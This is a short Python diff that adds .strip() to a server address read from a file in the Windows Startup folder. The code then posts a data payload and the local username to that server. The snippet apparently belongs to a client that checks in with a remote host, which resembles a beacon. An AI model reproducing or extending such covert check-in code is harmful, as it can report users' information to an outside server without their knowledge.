@@ -10,7 +10,7 @@ data = {
 }
 
 with open(f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/CurrentIP.txt", "r") as file:
-    server = file.read()
+    server = file.read().strip()
 
 print(username)
 response = requests.post(f"{server}/users", json=data)
